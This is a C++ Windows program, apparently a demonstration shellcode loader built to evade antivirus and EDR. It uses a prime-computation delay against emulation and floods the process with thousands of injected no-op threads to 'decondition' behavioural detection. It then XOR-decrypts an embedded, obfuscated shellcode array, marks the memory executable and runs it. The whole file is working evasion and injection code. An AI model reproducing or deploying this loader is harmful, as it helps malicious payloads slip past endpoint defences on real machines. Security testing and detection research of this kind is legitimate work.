#include <windows.h>
#include <chrono>
#include <iostream>
#include <iomanip>
#include <fstream>
#include <sstream>
#include <thread>


int main(int argc, char** argv) {

    // antiEmulation should be one of the first actions in the EXE
    std::cout << "Delaying start for about 5 seconds...\n";

    auto start_ae_calc = std::chrono::high_resolution_clock::now();
    volatile bool dummy_ae_calc; // do no optimze "calc prime" loop away
    for (UINT64 n = 2; n <= 10'000'000; ++n) { bool pr = true; for (UINT64 i = 2; i * i <= n; ++i) { if (n % i == 0) { pr = false; break; } } dummy_ae_calc = pr; }
    auto end_ae_calc = std::chrono::high_resolution_clock::now();
    auto ae_calc_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_ae_calc - start_ae_calc).count();

    // print current 
    std::cout << "Injector started with PID " << GetCurrentProcessId() << "\n";

    // open own process with read/write
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
    if (!hProcess) {
        std::cout << "Failed to open process: " << GetLastError() << "\n";
        return 1;
    }

    std::cout << "Press ENTER to start deconditioning";
    std::cin.get();

    BYTE nonsense[4096] = {};
    constexpr int rounds = 1000;
    int repetitions = 10; // one repetition is about 0.01 sec (with waiting for thread and freeing memory), according to CPU time with Get-Process
    std::cout << "Deconditioning";

    for (int n = 0; n < repetitions; n++) {
		std::cout << "." << std::flush;

        for (int i = 0; i < sizeof(nonsense) / sizeof(nonsense[0]); i++) {
            nonsense[i] = 0x90; // huiiiiiiiiiii
        }
        // xor eax, eax; ret
        nonsense[4093] = 0x31;
        nonsense[4094] = 0xC9;
        nonsense[4095] = 0xC3;

        void* allocs[rounds] = { 0 };
        for (int i = 0; i < sizeof(allocs) / sizeof(allocs[0]); i++) {
            LPVOID alloc_addr = VirtualAllocEx(hProcess, nullptr, sizeof(nonsense), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!alloc_addr) {
                allocs[i] = 0;
                std::cout << "Failed to alloc mem in round " << n << "-" << i << " , error=" << GetLastError() << "\n";
                continue;
            }
            allocs[i] = alloc_addr;
            if (!WriteProcessMemory(hProcess, alloc_addr, &nonsense, sizeof(nonsense), NULL)) {
                std::cout << "Failed to write mem in round " << n << "-" << i << " , error=" << GetLastError() << "\n";
                continue;
            }
            DWORD old_protect;
            if (!VirtualProtectEx(hProcess, alloc_addr, sizeof(nonsense), PAGE_EXECUTE_READ, &old_protect)) {
                std::cout << "Failed to change mem to RX in round " << n << "-" << i << " , error=" << GetLastError() << "\n";
                continue;
            }
            HANDLE hThreadDecon = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)alloc_addr, nullptr, 0, nullptr);
            if (!hThreadDecon) {
                std::cout << "Failed to create remote thread in round " << n << "-" << i << " , error=" << GetLastError() << "\n";
                continue;
            }
            else {
                WaitForSingleObject(hThreadDecon, INFINITE);
                CloseHandle(hThreadDecon);
            }

        }

        for (int i = 0; i < sizeof(allocs) / sizeof(allocs[0]); i++) {
            if (allocs[i] != 0 && !VirtualFreeEx(hProcess, allocs[i], 0, MEM_RELEASE)) {
                std::cout << "Failed to free mem in round " << n << "-" << i << " , error=" << GetLastError() << "\n";
            }
        }
    }

    std::cout << "Press ENTER to decrypt payload and inject";
    std::cin.get();

    // https://cyberchef.org/#recipe=From_Hex('Auto')XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=
    BYTE shellcode[] = { 0xb9,0x0e,0xc6,0xa2,0xb5,0xae,0x85,0x46,0x45,0x46,0x04,0x17,0x04,0x16,0x17,0x17,0x13,0x0e,0x74,0x94,0x20,0x0e,0xce,0x14,0x25,0x0e,0xce,0x14,0x5d,0x0e,0xce,0x14,0x65,0x0e,0xce,0x34,0x15,0x0e,0x4a,0xf1,0x0f,0x0c,0x08,0x77,0x8c,0x0e,0x74,0x86,0xe9,0x7a,0x24,0x3a,0x47,0x6a,0x65,0x07,0x84,0x8f,0x48,0x07,0x44,0x87,0xa7,0xab,0x17,0x07,0x14,0x0e,0xce,0x14,0x65,0xcd,0x07,0x7a,0x0d,0x47,0x95,0xcd,0xc5,0xce,0x45,0x46,0x45,0x0e,0xc0,0x86,0x31,0x21,0x0d,0x47,0x95,0x16,0xce,0x0e,0x5d,0x02,0xce,0x06,0x65,0x0f,0x44,0x96,0xa6,0x10,0x0d,0xb9,0x8c,0x07,0xce,0x72,0xcd,0x0e,0x44,0x90,0x08,0x77,0x8c,0x0e,0x74,0x86,0xe9,0x07,0x84,0x8f,0x48,0x07,0x44,0x87,0x7d,0xa6,0x30,0xb7,0x09,0x45,0x09,0x62,0x4d,0x03,0x7c,0x97,0x30,0x9e,0x1d,0x02,0xce,0x06,0x61,0x0f,0x44,0x96,0x23,0x07,0xce,0x4a,0x0d,0x02,0xce,0x06,0x59,0x0f,0x44,0x96,0x04,0xcd,0x41,0xce,0x0d,0x47,0x95,0x07,0x1d,0x07,0x1d,0x18,0x1c,0x1c,0x04,0x1e,0x04,0x1f,0x04,0x1c,0x0d,0xc5,0xa9,0x66,0x04,0x14,0xba,0xa6,0x1d,0x07,0x1c,0x1c,0x0d,0xcd,0x57,0xaf,0x12,0xb9,0xba,0xb9,0x18,0x0e,0xff,0x47,0x45,0x46,0x45,0x46,0x45,0x46,0x45,0x0e,0xc8,0xcb,0x44,0x47,0x45,0x46,0x04,0xfc,0x74,0xcd,0x2a,0xc1,0xba,0x93,0xfe,0xb6,0xf0,0xe4,0x13,0x07,0xff,0xe0,0xd0,0xfb,0xd8,0xb9,0x90,0x0e,0xc6,0x82,0x6d,0x7a,0x43,0x3a,0x4f,0xc6,0xbe,0xa6,0x30,0x43,0xfe,0x01,0x56,0x34,0x2a,0x2c,0x45,0x1f,0x04,0xcf,0x9f,0xb9,0x90,0x25,0x24,0x2a,0x26,0x68,0x20,0x3e,0x20,0x46 };
    for (size_t i = 0; i < sizeof(shellcode); ++i) { shellcode[i] ^= ((i & 1) == 0 ? 0x45 : 0x46); }

    // allocate memory
    LPVOID new_addr = VirtualAlloc(nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (new_addr) {
		std::cout << "Allocated memory for payload at " << (void*)new_addr << "\n";
    }
    else {
		std::cout << "Failed to allocate memory: " << GetLastError() << "\n";
        return 1;
    }

    // write value into process' memory
    memcpy(new_addr, shellcode, sizeof(shellcode));

    // change memory protection to executable
    DWORD old_protect;
    if (VirtualProtect(new_addr, sizeof(shellcode), PAGE_EXECUTE_READ, &old_protect)) {
		std::cout << "Changed memory protection to RX\n";
    }
    else {
        std::cout << "Failed to change memory protection: " << GetLastError() << "\n";
        VirtualFree(new_addr, 0, MEM_RELEASE);
        return 1;
    }

	std::cout << "Press ENTER to execute payload";
	std::cin.get();

    HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)new_addr, nullptr, 0, nullptr);
    if (hThread) {
        std::cout << "After creating thread\n";
        WaitForSingleObject(hThread, INFINITE); // Optional: wait for it to finish
        CloseHandle(hThread);
    }
    else {
        std::cout << "Failed to create remote thread: " << GetLastError() << "\n";
        return 1;
    }

    return 0;
}
